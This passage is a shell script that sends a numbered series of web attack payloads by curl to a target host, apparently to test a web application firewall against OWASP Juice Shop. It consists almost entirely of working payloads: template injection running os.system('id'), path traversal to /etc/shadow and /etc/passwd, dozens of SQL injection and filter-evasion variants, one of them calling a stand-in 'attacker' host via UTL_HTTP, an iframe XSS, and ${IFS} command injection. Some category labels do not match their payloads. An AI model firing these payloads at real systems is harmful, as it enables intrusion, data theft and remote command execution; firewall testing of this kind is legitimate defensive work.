printf '    payload: %s\n' '$\{self.module.runtime.exceptions.compat.inspect.linecache.os.system("id")\}'
curl -sk -i -m 15 "$HOST$URI?q=%24%5C%7Bself.module.runtime.exceptions.compat.inspect.linecache.os.system%28%22id%22%29%5C%7D" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0278 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '$\{self.attr._NSAttr__parent.module.runtime.exceptions.util.os.system("id")\}'
curl -sk -i -m 15 "$HOST$URI?q=%24%5C%7Bself.attr._NSAttr__parent.module.runtime.exceptions.util.os.system%28%22id%22%29%5C%7D" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0279 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '$\{self.context._with_template._mmarker.module.runtime.util.os.system("id")\}'
curl -sk -i -m 15 "$HOST$URI?q=%24%5C%7Bself.context._with_template._mmarker.module.runtime.util.os.system%28%22id%22%29%5C%7D" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0280 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '$\{self.context._with_template.module.filters.compat.inspect.os.system("id")\}'
curl -sk -i -m 15 "$HOST$URI?q=%24%5C%7Bself.context._with_template.module.filters.compat.inspect.os.system%28%22id%22%29%5C%7D" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0281 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '$\{self.context._with_template.module.runtime.compat.inspect.os.system("id")\}'
curl -sk -i -m 15 "$HOST$URI?q=%24%5C%7Bself.context._with_template.module.runtime.compat.inspect.os.system%28%22id%22%29%5C%7D" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0282 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '$\{self.context._with_template.module.runtime.exceptions.util.os.system("id")\}'
curl -sk -i -m 15 "$HOST$URI?q=%24%5C%7Bself.context._with_template.module.runtime.exceptions.util.os.system%28%22id%22%29%5C%7D" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0283 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '$\{self.template.module.runtime.exceptions.traceback.linecache.os.system("id")\}'
curl -sk -i -m 15 "$HOST$URI?q=%24%5C%7Bself.template.module.runtime.exceptions.traceback.linecache.os.system%28%22id%22%29%5C%7D" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0284 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '..%2f..%2f..%2fwin.ini'
curl -sk -i -m 15 "$HOST$URI?q=..%252f..%252f..%252fwin.ini" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0285 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '/var/www/html/../../../etc/shadow'
curl -sk -i -m 15 "$HOST$URI?q=%2Fvar%2Fwww%2Fhtml%2F..%2F..%2F..%2Fetc%2Fshadow" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0286 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '..\\\\..\\\\..\\\\boot.ini'
curl -sk -i -m 15 "$HOST$URI?q=..%5C%5C%5C%5C..%5C%5C%5C%5C..%5C%5C%5C%5Cboot.ini" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0287 | tuning=sqli | method=GET-querystring ==="
printf '    payload: %s\n' ''\''/**/OR/**/1/**/=/**/1--'
curl -sk -i -m 15 "$HOST$URI?q=%27%2F%2A%2A%2FOR%2F%2A%2A%2F1%2F%2A%2A%2F%3D%2F%2A%2A%2F1--" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0288 | tuning=sqli | method=GET-querystring ==="
printf '    payload: %s\n' ''\''%09OR%091=1'
curl -sk -i -m 15 "$HOST$URI?q=%27%2509OR%25091%3D1" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0289 | tuning=sqli | method=GET-querystring ==="
printf '    payload: %s\n' ''\''%20oR%201=1--'
curl -sk -i -m 15 "$HOST$URI?q=%27%2520oR%25201%3D1--" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0290 | tuning=sqli | method=GET-querystring ==="
printf '    payload: %s\n' ''\''+UNION+SELECT+NULL,NULL--'
curl -sk -i -m 15 "$HOST$URI?q=%27%2BUNION%2BSELECT%2BNULL%2CNULL--" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0291 | tuning=sqli | method=GET-querystring ==="
printf '    payload: %s\n' ''\''/*!12345OR*/1=1--'
curl -sk -i -m 15 "$HOST$URI?q=%27%2F%2A%2112345OR%2A%2F1%3D1--" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0292 | tuning=sqli | method=GET-querystring ==="
printf '    payload: %s\n' ''\''+/*!00000SELECT*/+NULL,NULL--'
curl -sk -i -m 15 "$HOST$URI?q=%27%2B%2F%2A%2100000SELECT%2A%2F%2BNULL%2CNULL--" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0293 | tuning=sqli | method=GET-querystring ==="
printf '    payload: %s\n' ''\'' AND 1=1#'
curl -sk -i -m 15 "$HOST$URI?q=%27%20AND%201%3D1%23" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0294 | tuning=sqli | method=GET-querystring ==="
printf '    payload: %s\n' ''\'' OR TRUE--'
curl -sk -i -m 15 "$HOST$URI?q=%27%20OR%20TRUE--" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0295 | tuning=sqli | method=GET-querystring ==="
printf '    payload: %s\n' ''\'' AND SLEEP(3)--'
curl -sk -i -m 15 "$HOST$URI?q=%27%20AND%20SLEEP%283%29--" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0296 | tuning=sqli | method=GET-querystring ==="
printf '    payload: %s\n' ''\''%2f**%2fOR%2f**%2f1=1--'
curl -sk -i -m 15 "$HOST$URI?q=%27%252f%2A%2A%252fOR%252f%2A%2A%252f1%3D1--" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0297 | tuning=sqli | method=GET-querystring ==="
printf '    payload: %s\n' '1'\'' or '\''1'\''='\''1'\'' --'
curl -sk -i -m 15 "$HOST$URI?q=1%27%20or%20%271%27%3D%271%27%20--" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0298 | tuning=sqli | method=GET-querystring ==="
printf '    payload: %s\n' '1 or 1=1'
curl -sk -i -m 15 "$HOST$URI?q=1%20or%201%3D1" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0299 | tuning=sqli | method=GET-querystring ==="
printf '    payload: %s\n' '0'\'' OR 1=1--'
curl -sk -i -m 15 "$HOST$URI?q=0%27%20OR%201%3D1--" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0300 | tuning=sqli | method=GET-querystring ==="
printf '    payload: %s\n' ''\'' OR 1=1 LIMIT 1--'
curl -sk -i -m 15 "$HOST$URI?q=%27%20OR%201%3D1%20LIMIT%201--" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0301 | tuning=sqli | method=GET-querystring ==="
printf '    payload: %s\n' ''\''||UTL_HTTP.REQUEST('\''http://attacker'\'')'
curl -sk -i -m 15 "$HOST$URI?q=%27%7C%7CUTL_HTTP.REQUEST%28%27http%3A%2F%2Fattacker%27%29" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0302 | tuning=sqli | method=GET-querystring ==="
printf '    payload: %s\n' ''\''||CHR(97)||CHR(98)||CHR(99)=abc'
curl -sk -i -m 15 "$HOST$URI?q=%27%7C%7CCHR%2897%29%7C%7CCHR%2898%29%7C%7CCHR%2899%29%3Dabc" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0303 | tuning=sqli | method=GET-querystring ==="
printf '    payload: %s\n' ''\'' UNION/**/SELECT/**/NULL,NULL--'
curl -sk -i -m 15 "$HOST$URI?q=%27%20UNION%2F%2A%2A%2FSELECT%2F%2A%2A%2FNULL%2CNULL--" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0304 | tuning=sqli | method=GET-querystring ==="
printf '    payload: %s\n' ''\'' or if(1=1,sleep(2),0)--'
curl -sk -i -m 15 "$HOST$URI?q=%27%20or%20if%281%3D1%2Csleep%282%29%2C0%29--" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0305 | tuning=sqli | method=GET-querystring ==="
printf '    payload: %s\n' '0x27206f7220313d31--'
curl -sk -i -m 15 "$HOST$URI?q=0x27206f7220313d31--" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0306 | tuning=sqli | method=GET-querystring ==="
printf '    payload: %s\n' '%u0027%20OR%201=1--'
curl -sk -i -m 15 "$HOST$URI?q=%25u0027%2520OR%25201%3D1--" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0307 | tuning=sqli | method=GET-querystring ==="
printf '    payload: %s\n' '%2527%2520OR%25201=1--'
curl -sk -i -m 15 "$HOST$URI?q=%252527%252520OR%2525201%3D1--" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0308 | tuning=sqli | method=GET-querystring ==="
printf '    payload: %s\n' '%27UNION%0ASELECT%0ANULL,NULL--'
curl -sk -i -m 15 "$HOST$URI?q=%2527UNION%250ASELECT%250ANULL%2CNULL--" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0309 | tuning=sqli | method=GET-querystring ==="
printf '    payload: %s\n' '1'\'' AND (SELECT 1 FROM dual WHERE 1=1)--'
curl -sk -i -m 15 "$HOST$URI?q=1%27%20AND%20%28SELECT%201%20FROM%20dual%20WHERE%201%3D1%29--" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0310 | tuning=sqli | method=GET-querystring ==="
printf '    payload: %s\n' '1'\'' AND (SELECT sleep(3))--'
curl -sk -i -m 15 "$HOST$URI?q=1%27%20AND%20%28SELECT%20sleep%283%29%29--" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0311 | tuning=sqli | method=GET-querystring ==="
printf '    payload: %s\n' ''\'' OR EXISTS(SELECT * FROM users)--'
curl -sk -i -m 15 "$HOST$URI?q=%27%20OR%20EXISTS%28SELECT%20%2A%20FROM%20users%29--" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0312 | tuning=sqli | method=GET-querystring ==="
printf '    payload: %s\n' ''\'' AND (SELECT 1 WHERE SUBSTRING(@@version,1,1)='\''5'\'')--'
curl -sk -i -m 15 "$HOST$URI?q=%27%20AND%20%28SELECT%201%20WHERE%20SUBSTRING%28%40%40version%2C1%2C1%29%3D%275%27%29--" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0313 | tuning=sqli | method=GET-querystring ==="
printf '    payload: %s\n' '1/**/OR/**/'\''1'\''/**/=/**/'\''1'
curl -sk -i -m 15 "$HOST$URI?q=1%2F%2A%2A%2FOR%2F%2A%2A%2F%271%27%2F%2A%2A%2F%3D%2F%2A%2A%2F%271" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0314 | tuning=sqli | method=GET-querystring ==="
printf '    payload: %s\n' '1+oR+1=1'
curl -sk -i -m 15 "$HOST$URI?q=1%2BoR%2B1%3D1" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0315 | tuning=sqli | method=GET-querystring ==="
printf '    payload: %s\n' '1%0bOR%0b1=1'
curl -sk -i -m 15 "$HOST$URI?q=1%250bOR%250b1%3D1" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0316 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '1/**/oR/**/1/**/=/**/1'
curl -sk -i -m 15 "$HOST$URI?q=1%2F%2A%2A%2FoR%2F%2A%2A%2F1%2F%2A%2A%2F%3D%2F%2A%2A%2F1" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0317 | tuning=sqli | method=GET-querystring ==="
printf '    payload: %s\n' '0'\''/**/UNION/**/SELECT/**/NULL,NULL--'
curl -sk -i -m 15 "$HOST$URI?q=0%27%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2FNULL%2CNULL--" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0318 | tuning=sqli | method=GET-querystring ==="
printf '    payload: %s\n' ''\''||mid(version(),1,1)=5'
curl -sk -i -m 15 "$HOST$URI?q=%27%7C%7Cmid%28version%28%29%2C1%2C1%29%3D5" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0319 | tuning=sqli | method=GET-querystring ==="
printf '    payload: %s\n' ''\''--%00'
curl -sk -i -m 15 "$HOST$URI?q=%27--%2500" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0320 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '/etc/passwd'
curl -sk -i -m 15 "$HOST$URI?q=%2Fetc%2Fpasswd" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0321 | tuning=sqli | method=GET-querystring ==="
printf '    payload: %s\n' ''\''/**/UNION/**/SELECT/**/NULL,NULL--'
curl -sk -i -m 15 "$HOST$URI?q=%27%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2FNULL%2CNULL--" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0322 | tuning=sqli | method=GET-querystring ==="
printf '    payload: %s\n' '1'\''/**/OR/**/'\''1'\''/**/=/**/'\''1'
curl -sk -i -m 15 "$HOST$URI?q=1%27%2F%2A%2A%2FOR%2F%2A%2A%2F%271%27%2F%2A%2A%2F%3D%2F%2A%2A%2F%271" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0323 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '<IFRAME SRC="jav&#x09;ascript:alert(1)">'
curl -sk -i -m 15 "$HOST$URI?q=%3CIFRAME%20SRC%3D%22jav%26%23x09%3Bascript%3Aalert%281%29%22%3E" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0324 | tuning=lfi | method=GET-querystring ==="
printf '    payload: %s\n' '....%5C....%5C....%5Cetc%5Cpasswd'
curl -sk -i -m 15 "$HOST$URI?q=....%255C....%255C....%255Cetc%255Cpasswd" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0325 | tuning=sqli | method=GET-querystring ==="
printf '    payload: %s\n' '1'\'' AND 1=1--'
curl -sk -i -m 15 "$HOST$URI?q=1%27%20AND%201%3D1--" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0326 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '1'\''||'\''1'
curl -sk -i -m 15 "$HOST$URI?q=1%27%7C%7C%271" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0327 | tuning=sqli | method=GET-querystring ==="
printf '    payload: %s\n' '1'\''--'
curl -sk -i -m 15 "$HOST$URI?q=1%27--" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0328 | tuning=sqli | method=GET-querystring ==="
printf '    payload: %s\n' '1'\'';--'
curl -sk -i -m 15 "$HOST$URI?q=1%27%3B--" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0329 | tuning=sqli | method=GET-querystring ==="
printf '    payload: %s\n' '1%27--'
curl -sk -i -m 15 "$HOST$URI?q=1%2527--" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0330 | tuning=sqli | method=GET-querystring ==="
printf '    payload: %s\n' '1'\''/**/OR/**/1/**/=/**/1--'
curl -sk -i -m 15 "$HOST$URI?q=1%27%2F%2A%2A%2FOR%2F%2A%2A%2F1%2F%2A%2A%2F%3D%2F%2A%2A%2F1--" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0331 | tuning=sqli | method=GET-querystring ==="
printf '    payload: %s\n' '1'\''/*+*/OR/*+*/1=1--'
curl -sk -i -m 15 "$HOST$URI?q=1%27%2F%2A%2B%2A%2FOR%2F%2A%2B%2A%2F1%3D1--" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0332 | tuning=sqli | method=GET-querystring ==="
printf '    payload: %s\n' ''\'' oR '\''1'\''='\''1'
curl -sk -i -m 15 "$HOST$URI?q=%27%20oR%20%271%27%3D%271" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0333 | tuning=sqli | method=GET-querystring ==="
printf '    payload: %s\n' ''\'' oR 1=1--'
curl -sk -i -m 15 "$HOST$URI?q=%27%20oR%201%3D1--" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0334 | tuning=sqli | method=GET-querystring ==="
printf '    payload: %s\n' '%31%27%20--'
curl -sk -i -m 15 "$HOST$URI?q=%2531%2527%2520--" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0335 | tuning=sqli | method=GET-querystring ==="
printf '    payload: %s\n' '1'\'' --'
curl -sk -i -m 15 "$HOST$URI?q=1%27%20--" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0336 | tuning=sqli | method=GET-querystring ==="
printf '    payload: %s\n' '%27%2F**%2FOR%2F**%2F1%3D1--'
curl -sk -i -m 15 "$HOST$URI?q=%2527%252F%2A%2A%252FOR%252F%2A%2A%252F1%253D1--" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0337 | tuning=sqli | method=GET-querystring ==="
printf '    payload: %s\n' '1 AND 1=1'
curl -sk -i -m 15 "$HOST$URI?q=1%20AND%201%3D1" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0338 | tuning=sqli | method=GET-querystring ==="
printf '    payload: %s\n' '1 OR 1=1'
curl -sk -i -m 15 "$HOST$URI?q=1%20OR%201%3D1" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0339 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' ''\''||'
curl -sk -i -m 15 "$HOST$URI?q=%27%7C%7C" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0340 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' ''\''||1'
curl -sk -i -m 15 "$HOST$URI?q=%27%7C%7C1" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0341 | tuning=sqli | method=GET-querystring ==="
printf '    payload: %s\n' '1-- -'
curl -sk -i -m 15 "$HOST$URI?q=1--%20-" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0342 | tuning=cmdi | method=GET-querystring ==="
printf '    payload: %s\n' 'sh$\{IFS\}-c$\{IFS\}whoami'
curl -sk -i -m 15 "$HOST$URI?q=sh%24%5C%7BIFS%5C%7D-c%24%5C%7BIFS%5C%7Dwhoami" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0343 | tuning=cmdi | method=GET-querystring ==="
printf '    payload: %s\n' 'bash$\{IFS\}-c$\{IFS\}'\''id'\'''
curl -sk -i -m 15 "$HOST$URI?q=bash%24%5C%7BIFS%5C%7D-c%24%5C%7BIFS%5C%7D%27id%27" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0344 | tuning=cmdi | method=GET-querystring ==="
printf '    payload: %s\n' '$\{IFS\}'\''id'\''}'
curl -sk -i -m 15 "$HOST$URI?q=%24%5C%7BIFS%5C%7D%27id%27%7D" -H "User-Agent: $USER_AGENT" | head -8
echo
